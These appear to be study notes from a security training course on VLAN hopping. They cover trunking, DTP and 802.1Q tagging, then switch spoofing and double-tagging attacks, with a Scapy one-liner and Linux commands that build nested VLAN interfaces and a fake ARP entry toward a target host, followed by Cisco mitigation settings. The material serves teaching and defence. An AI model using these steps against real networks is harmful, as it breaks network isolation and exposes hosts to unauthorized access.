

![Pasted image 20240806093842](../Images/Blackhat/Pasted%20image%2020240806093842.png)

### VLAN Discovery

* Why are these used?
	* Primarily for isolation
	* Security
	* Flexibility
	* Traffic load balance/decreases latency
* Massive scope as single error can lead to isolation breakage
* Learn VLAN basics to understand VLAN better
	* Trunking
	* 802.1Q tagging
	* Virtual interfaces

#### VLAN: Trunking

![Pasted image 20240806094027](../Images/Blackhat/Pasted%20image%2020240806094027.png)

#### VLAN: 802.1Q Tagging

* 802.1Q Tagging (IEEE Standard)
	* 4-byte tag (2 bytes TPID + 2 bytes TCI)
	* Inserted in the frame
* ISL Encapsulation (Inter switch link by Cisco)
* SVI (Switch Virtual Interface)
	* Allows traffic routing b/w VLANs by a def gw
	* Supports bridging cnofig and routing protocol

#### VLAN: Protocols in Use

* CDP - Cisco Discovery Protocol
	* Used by Cisco devices to communicate with neighbours
	* CDP announcements are sent over VLAN 1 
* STP - Spanning Tree Protocol
	* Builds network topology with focus on loop avoidance
* DTP - Dynamic Trunking Porotol
	* When you want to dynamically configure trunks on each switch port
	* Switch port modes: Access, Trunk, Dynamic Auto, Dynamic Desirable
* VTP - VLAN Trunking Protocol
	* Used to Transmit VLAN information and help with autoconfiguration
	* Broadcast on VLAN 1

#### VLAN: Concepts

* DTP negotiates interface modes dynamically based on port modes
* Generally used for Ports connecting two switches
* Dynamic auto is the default in newer Cisco IOS; whereas Dynamic Desirable is the default in older revisions

![Pasted image 20240806094543](../Images/Blackhat/Pasted%20image%2020240806094543.png)

* Unauthenticated Protocol: Anyone can send false DTP packets

#### VLAN: Hopping

* Attacking a network with multiple VLANs
* It is directed at trunking encapsulation protocols (802.1q/ISL)

**Two Attacks:**
* Switch Spoofing: Mimic a switch (inject DTP packets, negotiate with switch to act as 802.1Q trunk)
* Double tagging: Forwards the packet to a wrong VLAN, strips first header and forwards to the target VLAN, as defined within the second header

### Switch Spoofing

* Attack by mimicking a Switch
* Leverage issues with DTP configuration to gain trunk port

![Pasted image 20240806094831](../Images/Blackhat/Pasted%20image%2020240806094831.png)

#### VLAN Hopping: Attack

* Collect information:
	* VLAN IDs
	* IP addresses (gateways, hosts, anything)
	* Keep sniffing
* Toolset
	* Yersinia
	* Sniffers
	* arp-scan

#### VLAN: Attacks

* After negotiating a trunk link you can identify VLAN ID’s and add VLAN interfaces on your host to target these ranges
* Once successful, an easy approach is to perform ‘ARP’ sweeps/ping broadcast addresses to find live hosts on the target VLAN
* If there are any hosts, go for pwnage!
* If there are any devices, go for known service (Telnet, HTTP) weaknesses first, and further exploration!
* It’s effectively an open door to the whole of the network!

### Double Tagging

* Send double encapsulated 802.1Q frames
* Need access to native VLAN and access ports
* One way traffic Solution (Negative)

![Pasted image 20240806111635](../Images/Blackhat/Pasted%20image%2020240806111635.png)

**Double Tagging: Example**

* Two VLANs: 1 and 20
* VLAN 1 is native vlan
* All computer ports are access ports
* Attack video https://youtu.be/bbuYKughzS8
* Scapy One Liner
	* sendp(Ether(dst='ff:ff:ff:ff:ff:ff’, src='c2:db:bd:5d:bf:02')/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='10.0.20.11', src='10.0.1.11')/ICMP())

![Pasted image 20240806111759](../Images/Blackhat/Pasted%20image%2020240806111759.png)

#### Double Tagging: Things to Remember

* We need an access port on native lan
* Double tagging attacks are unidirectional only
* Hence the TCP / HTTP attacks won't work as it needs a 3-way handshake to start
* UDP attacks could be the way to go
* The exploit reverse shell could be obtained on an OOB channel

#### Double Tagging: Using Native Tools

* Load Kernel Module

```bash
modprobe 8021q
```

* Add VLAN-1 interface on eth2 interface and turn it on

```bash
ip link add link eth2 name eth2.1 type vlan id 1
```

* Add VLAN-20 interface on top of VLAN-1 interface

```bash
ip link add link eth2.1 name eth2.1.20 type vlan id 20
```

* Turn on VLAN-20 interface, assign it an IP within the target network's range

```bash
ip addr add 10.0.20.32/24 dev eth2.1.20 
ip link set dev eth2.1.20 up
```

* Add default route for target network via VLAN-20 interface

```bash
ip route add 10.0.20.0/24 via 10.0.20.32 dev eth2.1.20
```

* Add fake ARP entry for victim's IP address on VLAN-20 interface

```bash
arp -s 10.0.20.201 FF:FF:FF:FF:FF:FF -i eth2.1.20
```

#### VLAN: Attack Mitigation

* Example: **access** mode

```cisco
switchport mode access
switchport nonegotiate
switchport access vlan 100
```

* Example: **trunk** mode

```cisco
switchport trunk encapsulation dot1q
switchport mode trunk
switchport nonegotiate
switchport trunk allowed vlan 10,100
switchport trunk native vlan 1
```
